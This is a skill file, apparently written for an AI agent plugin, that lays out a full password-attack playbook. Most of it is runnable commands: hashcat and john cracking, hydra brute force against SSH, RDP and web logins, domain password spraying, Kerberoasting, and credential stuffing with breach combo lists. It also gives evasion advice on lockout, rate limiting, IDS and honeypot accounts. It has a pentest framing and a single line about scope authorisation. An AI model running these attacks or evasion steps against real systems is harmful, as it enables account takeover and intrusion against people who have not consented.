---
name: password-attacks
description: |
  This skill should be used when the user mentions "brute force", "password cracking",
  "hydra", "hashcat", "john the ripper", "credential stuffing", "password spray",
  "password spraying", "hash cracking", "wordlist", "dictionary attack", "mask attack",
  "rainbow table", "NTLM", "NTLMv2", "bcrypt", "Kerberoast", "Kerberoasting",
  "AS-REP roasting", "AS-REP roast", "golden ticket", "silver ticket", "ticket attack",
  "kerbrute", "crackmapexec", "medusa", "patator", "ncrack", "crowbar",
  "online attack", "offline attack", "credential attack", "credential testing",
  "hash identification", "hashid", "hash-identifier", "hash mode",
  "rule-based attack", "hybrid attack", "combinator attack", "prince attack",
  "CeWL", "CUPP", "crunch", "Mentalist", "wordlist generation",
  "custom wordlist", "targeted wordlist", "password policy",
  "account lockout", "lockout avoidance", "rate limiting", "login brute force",
  "SSH brute force", "RDP brute force", "FTP brute force", "SMB brute force",
  "HTTP form brute force", "web login attack", "credential reuse",
  "breach credentials", "combo list", "proxy rotation",
  "domain password spray", "Active Directory password", "AD credentials",
  "pass the hash", "pass the ticket", "overpass the hash",
  "hashpump", "hash length extension", "DPAPI", "SAM dump", "LSASS",
  "secretsdump", "mimikatz", "LaZagne", "credential dump",
  "rockyou", "seclists", "OneRuleToRuleThemAll",
  or discusses cracking passwords, testing credentials, or attacking authentication
  mechanisms in any protocol or service.
version: 2.0.0
---

# Password Attacks

Full-spectrum credential attack skill covering offline hash cracking, online service brute forcing, domain password spraying, targeted wordlist generation, Kerberos ticket attacks, and credential stuffing with breach data. Choose the right attack class, tool, and OPSEC posture based on the scenario.

## Why This Matters

Weak, reused, and default credentials remain the most common initial access vector across every engagement type. A single cracked hash can escalate from low-privilege foothold to domain admin. Password spraying bypasses per-account lockout policies. Breach credential reuse turns old leaks into fresh access. This skill covers every angle.

## Decision Tree — Choosing Your Attack

Before touching a tool, classify the scenario:

```
Do you have hashes/credentials offline?
├── YES → OFFLINE ATTACKS
│   ├── Know the hash type? → hashcat/john with correct mode
│   ├── Unknown hash type? → hashid/hash-identifier first
│   ├── Windows hashes (NTLM)? → hashcat -m 1000, pass-the-hash
│   ├── Kerberos tickets? → references/kerberos-attacks.md
│   └── Need custom wordlist? → references/wordlist-generation.md
│
└── NO → ONLINE ATTACKS
    ├── Single target, known creds format? → Hydra/Medusa
    ├── Domain/AD environment? → Password spraying (crackmapexec/kerbrute)
    ├── Have breach data for target users? → Credential stuffing
    ├── Web login form? → Hydra http-post-form / Patator
    └── Need to avoid lockout? → Spray with lockout-aware timing
```

## Methodology — Execution Order

### Phase 1 — Intelligence Gathering

Before attacking, gather intelligence that shapes your approach:

1. **Password policy**: Minimum length, complexity, lockout threshold, lockout duration, password history
2. **Target users**: Enumerate valid usernames (LDAP, Kerberos, web user enumeration, OSINT)
3. **Hash types**: Identify exact hash algorithm if you have offline hashes
4. **Service versions**: Protocol-specific quirks affect tool selection
5. **Prior findings**: Check if credentials were already found in other phases

```bash
# Check for existing credential findings
node ${CLAUDE_PLUGIN_ROOT}/scripts/findings-tracker.js search credential
node ${CLAUDE_PLUGIN_ROOT}/scripts/findings-tracker.js search password

# Check what techniques have already been tried
node ${CLAUDE_PLUGIN_ROOT}/scripts/techniques-tracker.js search "brute\|spray\|crack\|password"
```

### Phase 2 — Hash Identification (Offline Only)

When you have hashes, identify them before cracking. Wrong mode = wasted time.

```bash
# Automated identification
hashid '<hash_value>'
hashid -m '<hash_value>'  # Show hashcat mode numbers

# hash-identifier (interactive but useful for ambiguous hashes)
hash-identifier
```

**Quick identification by format:**

| Format | Type | Hashcat Mode |
|--------|------|-------------|
| 32 hex chars | MD5 or NTLM | 0 or 1000 |
| 40 hex chars | SHA1 | 100 |
| 64 hex chars | SHA256 | 1400 |
| 128 hex chars | SHA512 | 1700 |
| `$2a$`/`$2b$`/`$2y$` + 60 chars | bcrypt | 3200 |
| `$6$` + salt + `$` + 86 chars | SHA512crypt (Linux) | 1800 |
| `$5$` + salt + `$` + 43 chars | SHA256crypt (Linux) | 7400 |
| `$1$` + salt + `$` + 22 chars | MD5crypt | 500 |
| `$P$` or `$H$` + 31 chars | phpass (WordPress) | 400 |
| `$apr1$` + salt + `$` + 22 chars | Apache MD5 | 1600 |
| `user::domain:challenge:hash:blob` | NetNTLMv2 | 5600 |
| `$krb5tgs$23$*...` | Kerberos TGS-REP (RC4) | 13100 |
| `$krb5tgs$17$*...` | Kerberos TGS-REP (AES128) | 19600 |
| `$krb5tgs$18$*...` | Kerberos TGS-REP (AES256) | 19700 |
| `$krb5asrep$23$...` | AS-REP (RC4) | 18200 |

See `references/hash-cracking.md` for exhaustive hash type reference and cracking strategies.

### Phase 3 — Offline Cracking

**Hashcat** (GPU-accelerated, preferred for speed):
Load: `ToolSearch` -> `select:mcp__hexstrike-ai__hashcat_crack`

```bash
# Dictionary attack
hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules
hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8-char: uppercase + 6 lower + digit)
hashcat -m <mode> -a 3 hashes.txt '?u?l?l?l?l?l?l?d'

# Hybrid: wordlist + mask append
hashcat -m <mode> -a 6 hashes.txt /usr/share/wordlists/rockyou.txt '?d?d?d?d'

# Show cracked passwords
hashcat -m <mode> hashes.txt --show
```

**John the Ripper** (CPU, good format detection, rule engine):
Load: `ToolSearch` -> `select:mcp__hexstrike-ai__john_crack`

```bash
# Auto-detect format, wordlist attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify format explicitly
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Wordlist + rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt

# Show cracked passwords
john --show hashes.txt
```

See `references/hash-cracking.md` for GPU optimization, advanced rule strategies, and full mode reference.

### Phase 4 — Online Attacks

**Hydra** (multi-protocol, most versatile):
Load: `ToolSearch` -> `select:mcp__hexstrike-ai__hydra_attack`

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1 -t 4

# HTTP POST form
hydra -l admin -P wordlist.txt 10.10.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" -t 4

# RDP with rate limiting
hydra -l administrator -P wordlist.txt rdp://10.10.10.1 -t 1 -W 3
```

**OPSEC for online attacks:**
- Check lockout policy BEFORE attacking — `net accounts /domain` or LDAP query
- Start with 1-4 threads for sensitive targets
- Add `-W <seconds>` wait time between attempts per thread
- Monitor for 429/503 responses indicating rate limiting
- Rotate source IPs with proxychains if available
- Log ALL attempts — failed logins generate events

See `references/online-attacks.md` for full protocol coverage and lockout avoidance.

### Phase 5 — Password Spraying

Spray one password across many accounts — bypasses per-account lockout.

```bash
# Domain spray with crackmapexec
crackmapexec smb 10.10.10.1 -u users.txt -p 'Company2024!' --continue-on-success

# Kerberos-based spray (no failed logon events on target)
kerbrute passwordspray -d corp.local --dc 10.10.10.1 users.txt 'Summer2024!'
```

**Spray strategy:**
1. One password per lockout window (e.g., every 30 minutes)
2. Start with seasonal patterns: `Season+Year+!` (e.g., `Winter2025!`)
3. Then company-specific: `CompanyName+digits+special`
4. Monitor for successful auth AND lockout indicators

See `references/password-spraying.md` for full methodology and common password patterns.

### Phase 6 — Kerberos Attacks

When targeting Active Directory, Kerberos tickets provide offline cracking opportunities without triggering logon failure events.

```bash
# Kerberoasting — request TGS tickets for service accounts
impacket-GetUserSPNs -request -dc-ip 10.10.10.1 corp.local/user:password -outputfile kerberoast.txt

# AS-REP Roasting — target accounts without pre-auth
impacket-GetNPUsers -usersfile users.txt -no-pass -dc-ip 10.10.10.1 corp.local/ -outputfile asrep.txt

# Crack extracted tickets
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

See `references/kerberos-attacks.md` for golden/silver tickets, delegation attacks, and full AD credential attack chains.

### Phase 7 — Credential Stuffing

When breach data is available, test credential reuse across target services.

```bash
# Deduplicate and format combo list (email:password)
sort -u -t: -k1,1 breach_data.txt > deduped_combos.txt

# Test against web login
hydra -C deduped_combos.txt 10.10.10.1 http-post-form \
  "/login:email=^USER^&password=^PASS^:F=Invalid" -t 2

# Test against multiple services
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

See `references/credential-stuffing.md` for breach data handling, multi-service testing, and detection avoidance.

## OPSEC Considerations

| Concern | Mitigation |
|---------|------------|
| Account lockout | Check policy first; spray 1 password per window; use Kerberos pre-auth for enumeration |
| Failed logon events (4625) | Kerberoasting/AS-REP roasting generate minimal events; use kerbrute over SMB spray |
| Rate limiting | Low thread count (`-t 1`), delays (`-W 5`), proxy rotation |
| IDS/IPS detection | Vary timing, avoid default tool user-agents, use encrypted protocols |
| Honeypot accounts | Skip accounts with unusual naming or creation dates |
| Legal exposure | Verify scope authorization covers brute force; document consent |

## Hash Length Extension

Load: `ToolSearch` -> `select:mcp__hexstrike-ai__hashpump_attack`
- For MAC bypass when using `secret + message` pattern (MD5/SHA1/SHA256)
- Requires knowledge of secret length (can brute force length)

## Recording Findings

Log every cracked credential and attack attempt:

```bash
# Log a cracked credential
node ${CLAUDE_PLUGIN_ROOT}/scripts/findings-tracker.js add \
  "<target>" "auth-bypass" "password" "HIGH" "Cracked credential: <user>@<service>"

# Log the technique
node ${CLAUDE_PLUGIN_ROOT}/scripts/techniques-tracker.js add \
  "hashcat" "<target>" "offline-hash-crack-<type>" "success" \
  --notes "Cracked N/M hashes using <wordlist> + <rules>"

# Log a successful spray
node ${CLAUDE_PLUGIN_ROOT}/scripts/techniques-tracker.js add \
  "crackmapexec" "<target>" "password-spray-smb" "success" \
  --notes "Valid credential found: <user>:<password>"
```

### Severity Classification

| Severity | Criteria |
|----------|----------|
| `CRITICAL` | Domain admin, root, or service account credentials; credentials granting access to critical infrastructure |
| `HIGH` | Standard user credentials with network/application access; credentials enabling lateral movement |
| `MEDIUM` | Limited-access credentials; credentials for non-production systems |
| `LOW` | Cracked hashes for decommissioned accounts; weak password policy confirmed but no access gained |
| `INFO` | Hash type identification only; password policy details gathered |

## Tool Reference

| Tool | Purpose | Install |
|------|---------|---------|
| `hashcat` | GPU-accelerated offline hash cracking | `apt install hashcat` |
| `john` | CPU-based hash cracking with strong rule engine | `apt install john` |
| `hydra` | Multi-protocol online brute forcing | `apt install hydra` |
| `medusa` | Parallel online brute forcing | `apt install medusa` |
| `patator` | Modular multi-service brute forcer | `apt install patator` |
| `ncrack` | Network auth cracking (Nmap project) | `apt install ncrack` |
| `crackmapexec` | AD/SMB/WinRM password spraying | `apt install crackmapexec` |
| `kerbrute` | Kerberos brute force and user enum | GitHub release |
| `impacket` | Kerberoast, AS-REP roast, secretsdump | `apt install python3-impacket` |
| `hashid` | Hash type identification | `apt install hashid` |
| `CeWL` | Custom wordlist from web crawl | `apt install cewl` |
| `CUPP` | Common User Password Profiler | `apt install cupp` |
| `crunch` | Pattern-based wordlist generation | `apt install crunch` |

## References

- `references/hash-cracking.md` -- Offline cracking: hashcat/john modes, GPU optimization, rule strategies, advanced techniques
- `references/online-attacks.md` -- Hydra/Medusa/Patator for SSH, FTP, HTTP, SMB, RDP; proxy rotation, lockout avoidance
- `references/password-spraying.md` -- Domain spraying: crackmapexec, kerbrute, common patterns, lockout-aware timing
- `references/wordlist-generation.md` -- CeWL, CUPP, crunch, Mentalist, combinator attacks, rule-based mutation
- `references/credential-stuffing.md` -- Breach data handling, deduplication, multi-service testing, detection avoidance
- `references/kerberos-attacks.md` -- Kerberoasting, AS-REP roasting, golden/silver tickets, AD credential chains
